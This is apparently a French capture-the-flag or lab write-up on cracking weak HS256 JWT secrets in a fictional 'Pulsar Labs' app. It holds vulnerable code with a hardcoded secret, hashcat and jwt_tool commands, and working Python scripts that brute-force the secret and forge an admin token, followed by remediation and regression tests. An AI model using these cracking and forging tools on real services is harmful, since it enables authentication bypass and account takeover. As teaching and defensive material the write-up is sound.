# Write-up : Weak JWT Secrets — Cracking HS256

---

## Résumé exécutif

Un JWT signé avec HMAC-SHA256 dépend entièrement de la robustesse de son secret. Si ce secret est court, prévisible, présent dans un dictionnaire ou composé de mots communs, il peut être retrouvé hors ligne par force brute ou par attaque par dictionnaire. Une fois le secret connu, l'attaquant peut forger des tokens arbitraires, se faire passer pour n'importe quel utilisateur et contourner intégralement le contrôle d'accès. L'attaque est entièrement hors ligne : elle n'émet aucune requête vers le serveur et ne peut pas être détectée par les journaux applicatifs.

- **Sévérité** : Critique (CVSS 9.4)
- **CWE** : CWE-521 (Weak Password Requirements) / CWE-326 (Inadequate Encryption Strength) / CWE-798 (Use of Hard-coded Credentials)
- **Catégorie OWASP** : A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures
- **Impact** : Compromission totale de l'authentification, forge de tokens administrateur
- **Exploitabilité** : Facile avec GPU ou dictionnaire adapté

---

## 1. Rappel sur HMAC-SHA256

HS256 est un algorithme de signature symétrique défini par la RFC 7518. Il repose sur HMAC (Hash-based Message Authentication Code) couplé à SHA-256.

Fonctionnement :

```
signature = HMAC-SHA256(secret, header_base64 + "." + payload_base64)
```

Points caractéristiques :

| Propriété | Valeur |
|-----------|--------|
| Type | Symétrique |
| Clé | Unique, partagée entre signataire et vérificateur |
| Taille de sortie | 256 bits |
| Taille de clé recommandée | Au moins 256 bits (32 octets) d'entropie |
| Complexité de vérification | Une seule opération HMAC |

La sécurité d'HS256 repose sur deux conditions :

1. Le secret doit rester confidentiel côté serveur
2. Le secret doit disposer d'une entropie suffisante pour résister aux attaques par force brute

Si l'une de ces conditions n'est pas remplie, la sécurité du JWT s'effondre.

---

## 2. Entropie et espace de recherche

### 2.1 Définition de l'entropie

L'entropie mesure l'imprévisibilité d'un secret, exprimée en bits. Pour un secret tiré uniformément dans un ensemble de taille N, l'entropie vaut log2(N).

| Type de secret | Taille | Entropie | Espace de recherche |
|----------------|--------|----------|---------------------|
| Mot du dictionnaire | 8 caractères | ~20 bits | 10^6 |
| Mot + année | 12 caractères | ~30 bits | 10^9 |
| Alphanumérique 8 caractères | 8 caractères | ~48 bits | 10^14 |
| Alphanumérique 12 caractères | 12 caractères | ~72 bits | 10^21 |
| 32 octets aléatoires | 32 octets | 256 bits | 10^77 |

Chaque bit d'entropie supplémentaire double l'espace de recherche. La différence entre 30 bits et 256 bits est un facteur de 10^68.

### 2.2 Vitesse de calcul

HMAC-SHA256 est une opération rapide. Un processeur moderne exécute plusieurs millions d'opérations par seconde, une carte graphique plusieurs milliards.

| Plateforme | Vitesse (HMAC-SHA256) |
|------------|----------------------|
| CPU (i7 8 cœurs) | ~5 à 15 MH/s |
| GPU (RTX 3090) | ~5 GH/s |
| GPU (RTX 4090) | ~20 GH/s |
| Cluster GPU (8× A100) | ~100 GH/s |

À 20 GH/s, un espace de 2^48 (alphanumérique 8 caractères) est épuisé en quelques heures. Un espace de 2^80 (alphanumérique 13-14 caractères) résisterait des siècles.

---

## 3. Principe de l'attaque

### 3.1 Attaque hors ligne

Une fois qu'un attaquant possède un token JWT valide (par exemple après s'être inscrit sur la plateforme), il connaît :

- Le header
- Le payload
- La signature

Il peut alors tester des secrets candidats en local. Pour chaque candidat, il recalcule la signature et la compare à celle du token. Si elles correspondent, le secret est trouvé.

Aucune interaction avec le serveur n'est nécessaire. L'attaque ne génère aucun trafic, aucune erreur, aucun événement suspect dans les journaux.

### 3.2 Conditions

| Condition | Description |
|-----------|-------------|
| Token JWT valide disponible | Obtenu par simple inscription ou connexion |
| Algorithme HMAC | HS256, HS384 ou HS512 |
| Secret faible | Court, prévisible, ou présent dans un dictionnaire |

L'attaque ne fonctionne pas si le serveur utilise RS256 ou ES256 (asymétrique), car la clé privée n'est jamais exposée.

### 3.3 Formule de comparaison

Pour un token donné `header.payload.signature` :

```
sig_candidate = HMAC-SHA256(candidate_secret, "header.payload")
si sig_candidate == signature_reçue :
    secret trouvé
```

La comparaison s'effectue en temps constant (`hmac.compare_digest`) pour éviter les fuites par timing.

---

## 4. Types de secrets vulnérables

| Catégorie | Exemples | Entropie |
|-----------|----------|----------|
| Mot du dictionnaire | `secret`, `password`, `admin` | Très faible |
| Mot + année | `pulsar2024`, `company2023` | Faible |
| Mot + chiffres courts | `admin123`, `root2024` | Faible |
| Nom d'entreprise | `pulsarlabs`, `pulsar-secret` | Faible |
| Phrase commune | `changeme`, `letmein`, `qwerty` | Très faible |
| Secret par défaut | `your-256-bit-secret` | Connu publiquement |
| Clé courte | `abc`, `12345`, `key` | Mathématiquement fragile |

Les secrets par défaut des bibliothèques sont particulièrement dangereux. Des chaînes comme `your-256-bit-secret` (jwt.io), `secret`, `password` figurent dans toutes les listes de mots de passe.

---

## 5. Contexte historique

Le cracking de secrets JWT est utilisé depuis 2015 en pentest. Des outils dédiés sont apparus rapidement.

| Outil | Usage |
|-------|-------|
| hashcat (mode 16500) | Cracking GPU haute performance |
| John the Ripper | Alternative CPU/GPU |
| jwt_tool | Framework JWT complet (mode -C pour crack) |
| jwt-cracker (npm) | Cracker Node.js simple |
| c-jwt-cracker | Cracker C optimisé |
| jwt-secrets (SecLists) | Wordlists spécialisées |

CVE associées à la faible robustesse des secrets :

- CVE-2020-28042 (ServiceStack)
- CVE-2021-41118 (jsonwebtoken)

La faille est référencée dans OWASP A02:2021 (Cryptographic Failures).

---

## 6. Environnement du laboratoire

### 6.1 Application cible

Pulsar Labs est une plateforme d'infrastructure GPU à la demande. L'authentification repose sur des JWT HS256 signés avec un secret faible.

### 6.2 Comptes de test

```
Développeur : dev / dev123    (role: user)
Administrateur : admin / admin123 (role: admin)
```

### 6.3 Endpoints

```
GET  /                     - Page de connexion
GET  /dashboard            - Console développeur
POST /api/login            - Authentification
GET  /api/me               - Profil courant
GET  /api/token            - Renvoie le token courant (utile en lab)
GET  /api/admin/vulnerable - Console admin (secret faible)
GET  /api/admin/secure     - Console admin (secret robuste)
```

### 6.4 Secret vulnérable

```
SECRET_KEY = b"pulsar2024"
```

Ce secret combine le nom de l'entreprise (`pulsar`) et une année (`2024`). Il figure dans la plupart des wordlists courantes après application de règles de mutation.

---

## 7. Analyse du code vulnérable

### 7.1 Signature

```python
SECRET_KEY = b"pulsar2024"

def make_token(username):
    u = USERS[username]
    return jwt_encode({
        "sub": u["sub"],
        "username": username,
        "email": u["email"],
        "role": u["role"],
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }, SECRET_KEY)
```

Le secret est codé en dur dans le code source, court, et directement devinable.

### 7.2 Vérification

```python
def jwt_decode(token, secret):
    parts = token.split(".")
    h_b64, p_b64, s_b64 = parts
    header = json.loads(b64d(h_b64))
    payload = json.loads(b64d(p_b64))

    if header.get("alg") != "HS256":
        raise ValueError("algorithm not allowed")

    expected = b64e(hmac.new(secret, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest())
    if not hmac.compare_digest(expected, s_b64):
        raise ValueError("invalid signature")

    return payload
```

La vérification est correcte. La faille ne réside pas dans le code mais dans la valeur du secret.

### 7.3 Anti-patterns identifiés

| Anti-pattern | Description |
|--------------|-------------|
| Secret en dur | Présent dans le code source |
| Secret court | 10 caractères |
| Faible entropie | Mot + année |
| Aucune rotation | Le même secret depuis le démarrage |
| Aucune longueur minimale imposée | Le serveur accepte n'importe quelle taille |

---

## 8. Exploitation pas à pas

### 8.1 Reconnaissance

Connexion avec le compte utilisateur standard.

```
POST /api/login
Content-Type: application/json

{"username":"dev","password":"dev123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJkZXYiLCJlbWFpbCI6ImRldkBwdWxzYXIuaW8iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxOTk5OTk5OSwiZXhwIjoxNzIwMDAzNTk5fQ.xxxxx
```

Le token est récupéré via le cookie.

### 8.2 Extraction du token

```bash
curl -s -X POST http://127.0.0.1:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"dev","password":"dev123"}' \
  -c cookie.txt

grep token cookie.txt | awk '{print $NF}' > token.txt

cat token.txt
```

Contenu de `token.txt` :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJkZXYiLCJlbWFpbCI6ImRldkBwdWxzYXIuaW8iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxOTk5OTk5OSwiZXhwIjoxNzIwMDAzNTk5fQ.xxxxx
```

### 8.3 Cracking avec hashcat

Hashcat dispose d'un mode dédié aux JWT HMAC, le mode `16500`.

Préparation :

```bash
# Créer un dictionnaire minimal
cat > wordlist.txt << 'EOF'
password
123456
admin
secret
pulsar2023
pulsar2024
pulsar2025
pulsarlabs
pulsar-labs
admin123
qwerty
letmein
EOF
```

Lancement :

```bash
hashcat -m 16500 -a 0 token.txt wordlist.txt
```

Résultat :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...xxxxx:pulsar2024

Status...........: Cracked
```

Le secret `pulsar2024` est trouvé en moins d'une seconde.

### 8.4 Cracking avec rockyou.txt

Pour un secret moins évident, utiliser une wordlist plus large :

```bash
hashcat -m 16500 -a 0 token.txt /usr/share/wordlists/rockyou.txt
```

Ajouter des règles de mutation pour détecter les variantes :

```bash
hashcat -m 16500 -a 0 token.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

Les règles `best64` appliquent des transformations courantes : capitalisation, ajout de chiffres, substitution de caractères.

### 8.5 Cracking avec un script Python

Pour une démonstration pédagogique, un script Python minimal suffit.

```python
import base64
import hmac
import hashlib
import sys
import time

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def crack(token, wordlist_path):
    parts = token.split(".")
    h_b64, p_b64, s_b64 = parts
    signing_input = f"{h_b64}.{p_b64}".encode()
    target_sig = b64d(s_b64)

    start = time.time()
    tested = 0

    with open(wordlist_path, "r", encoding="latin-1") as f:
        for line in f:
            tested += 1
            candidate = line.strip().encode()
            sig = hmac.new(candidate, signing_input, hashlib.sha256).digest()

            if hmac.compare_digest(sig, target_sig):
                elapsed = time.time() - start
                rate = tested / elapsed if elapsed > 0 else 0
                print(f"Secret trouvé : {candidate.decode()}")
                print(f"Candidats testés : {tested}")
                print(f"Temps : {elapsed:.2f} secondes")
                print(f"Vitesse : {rate:,.0f} essais/seconde")
                return candidate.decode()

    print(f"Secret non trouvé ({tested} candidats testés)")
    return None

if __name__ == "__main__":
    token = open(sys.argv[1]).read().strip()
    crack(token, sys.argv[2])
```

Utilisation :

```bash
python3 crack.py token.txt wordlist.txt
```

### 8.6 Cracking avec jwt_tool

```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

Sortie :

```
[+] secret found: pulsar2024
```

### 8.7 Forge d'un token administrateur

Une fois le secret connu, tout payload peut être signé.

```python
import base64
import json
import hmac
import hashlib
import time

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

SECRET = b"pulsar2024"

header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "0",
    "username": "dev",
    "email": "dev@pulsar.io",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(SECRET, f"{h}.{p}".encode(), hashlib.sha256).digest()
token = f"{h}.{p}.{b64e(sig)}"

print(token)
```

### 8.8 Envoi et accès

```
GET /api/admin/vulnerable
Cookie: token=<token forgé>
```

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{w34k_s3cr3ts_4r3_cr4ck3d}",
    ...
  }
}
```

### 8.9 Vérification sur l'endpoint sécurisé

Le même token envoyé sur l'endpoint corrigé :

```
GET /api/admin/secure
Cookie: token=<token forgé>
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Bloqué: invalid signature"}
```

Le serveur sécurisé utilise un secret robuste de 256 bits. La signature forgée ne correspond pas.

---

## 9. Variantes d'exploitation

### 9.1 Secret par défaut d'une bibliothèque

Beaucoup de bibliothèques utilisent un secret par défaut en exemple. Les plus courants :

```
your-256-bit-secret
your-secret-key
my-secret-key
jwt-secret
change-me
```

Ces chaînes figurent dans toutes les wordlists JWT.

### 9.2 Secret construit à partir du nom de domaine

```
pulsar.io -> pulsario
pulsarlabs
pulsar-labs-jwt
pulsar-2024-jwt
```

Les règles de mutation de hashcat couvrent ces combinaisons.

### 9.3 Secret basé sur un UUID ou un hash faible

Un secret tronqué (`MD5("password")[:8]`) reste vulnérable. Les wordlists incluent souvent les hashs MD5 et SHA1 de mots courants.

### 9.4 Attaque par masque

Si le format du secret est partiellement connu (`pulsar????`), un masque accélère le cracking :

```bash
hashcat -m 16500 -a 3 token.txt "pulsar?d?d?d?d"
```

### 9.5 Attaque hybride

Combiner dictionnaire et masque pour couvrir les variantes :

```bash
hashcat -m 16500 -a 6 token.txt rockyou.txt "?d?d?d?d"
```

Chaque mot du dictionnaire est complété par quatre chiffres.

### 9.6 Récupération depuis un dépôt Git

Un secret commité puis supprimé reste accessible dans l'historique Git. Des outils comme `trufflehog` ou `gitleaks` permettent de scanner un dépôt à la recherche de secrets.

```bash
gitleaks detect --source . --report-format json
```

---

## 10. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| Algorithme HMAC | HS256, HS384 ou HS512 |
| Token disponible | Obtenu par inscription ou connexion |
| Secret faible | Entropie insuffisante |
| Secret non renouvelé | Le même secret depuis longtemps |

Un compte gratuit sur la plateforme suffit.

---

## 11. Remédiation

### 11.1 Principe directeur

Un secret HMAC doit disposer d'au moins 256 bits d'entropie et être stocké hors du code source.

### 11.2 Génération d'un secret robuste

```python
import secrets

SECRET_KEY = secrets.token_bytes(32)
```

`secrets.token_bytes(32)` génère 32 octets (256 bits) depuis une source cryptographiquement sûre. L'espace de recherche résultant (2^256) est hors de portée de toute attaque.

Alternative sous forme de chaîne URL-safe :

```python
SECRET_KEY = secrets.token_urlsafe(32).encode()
```

### 11.3 Stockage sécurisé

```python
import os

SECRET_KEY = os.environ.get("JWT_SECRET", "").encode()

if len(SECRET_KEY) < 32:
    raise RuntimeError("JWT_SECRET manquant ou trop court (minimum 32 octets)")
```

Génération au déploiement :

```bash
python3 -c "import secrets; print(secrets.token_urlsafe(32))" \
  >> /etc/pulsar/secrets.env
```

Le secret n'est jamais présent dans le code source.

### 11.4 Rotation des secrets

```python
CURRENT_SECRET = load_secret("current")
PREVIOUS_SECRET = load_secret("previous")

def verify_token(token):
    for secret in (CURRENT_SECRET, PREVIOUS_SECRET):
        try:
            return jwt_decode(token, secret)
        except InvalidSignature:
            continue
    raise InvalidToken()
```

La rotation régulière limite la fenêtre d'exploitation. Les tokens signés avec l'ancien secret expirent naturellement.

### 11.5 Préférence pour les algorithmes asymétriques

RS256 et ES256 suppriment la dépendance à un secret symétrique. Aucun cracking HS256 n'est possible.

```python
# RS256 avec clé privée serveur
token = jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")

# Vérification avec clé publique
payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
```

Les clés RSA 2048 bits offrent une sécurité équivalente à 112 bits d'entropie symétrique. Les clés RSA 4096 bits atteignent 128 bits.

### 11.6 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Longueur minimale imposée | Rejeter tout secret inférieur à 32 octets au démarrage |
| Vérification d'entropie | Détecter les secrets triviaux au déploiement |
| Détection de fuite | Scanner les dépôts avec gitleaks / trufflehog |
| Rotation planifiée | Renouveler tous les 30 à 90 jours |
| Journalisation | Alerter sur les tentatives de crack (impossible en offline mais utile pour d'autres vecteurs) |
| Gestion par KMS | Stocker les secrets dans un service dédié |
| Audit des dépendances | Vérifier les secrets par défaut des bibliothèques |

### 11.7 Détection par analyse statique

Patterns à rechercher :

```
SECRET_KEY = "..."
secret = "changeme"
JWT_SECRET = "your-256-bit-secret"
jwt.encode(payload, "hardcoded-secret")
process.env.JWT_SECRET || "default"
```

Toute chaîne littérale utilisée comme secret doit être auditée.

---

## 12. Tests de non-régression

```python
def test_secret_longueur_minimale():
    assert len(SECRET_KEY) >= 32

def test_secret_non_present_dans_le_code():
    import inspect
    source = inspect.getsource(module_jwt)
    assert "pulsar2024" not in source

def test_token_signe_avec_mauvais_secret_rejete(client):
    token = jwt.encode({"role": "admin"}, b"mauvais", algorithm="HS256")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401
```

---

## 13. Impact métier

Pour Pulsar Labs, l'exploitation de cette vulnérabilité permet :

- Accès complet à la console d'administration
- Exécution de jobs GPU arbitraires (coûts directs)
- Accès aux clés d'API internes (`api_master_key`, `webhook_signing`)
- Manipulation des secrets de production
- Persistance tant que le secret n'est pas renouvelé
- Compromission de l'ensemble du cluster

Sur une plateforme facturée à l'usage, l'attaque peut entraîner des coûts opérationnels importants.

---

## 14. Conclusion

La robustesse d'un JWT HS256 dépend directement de l'entropie de son secret. Un secret faible transforme la signature cryptographique en simple chaîne de contrôle sans valeur.

L'attaque est entièrement hors ligne, indétectable, et réalisable avec du matériel grand public. Elle rend la signature JWT inutile en pratique.

Trois pratiques éliminent cette classe de failles :

1. Générer les secrets avec un CSPRNG (`secrets.token_bytes(32)`)
2. Stocker les secrets hors du code source (variables d'environnement, vault)
3. Préférer les algorithmes asymétriques (RS256, ES256) quand c'est possible

Un secret de 256 bits aléatoires rend le cracking impossible avec les moyens actuels et prévisibles. Un secret faible le rend trivial.

---

## Références

- RFC 7515 — JSON Web Signature (JWS)
- RFC 7518 — JSON Web Algorithms (JWA)
- NIST SP 800-107 — Recommendation for Applications Using Approved Hash Algorithms
- NIST SP 800-63B — Digital Identity Guidelines (Authenticator Management)
- OWASP Top 10 — A02:2021 Cryptographic Failures
- OWASP Top 10 — A07:2021 Identification and Authentication Failures
- OWASP JSON Web Token Cheat Sheet
- CWE-521 : Weak Password Requirements
- CWE-326 : Inadequate Encryption Strength
- CWE-798 : Use of Hard-coded Credentials
- Hashcat documentation — mode 16500
- PortSwigger Web Security Academy — JWT attacks
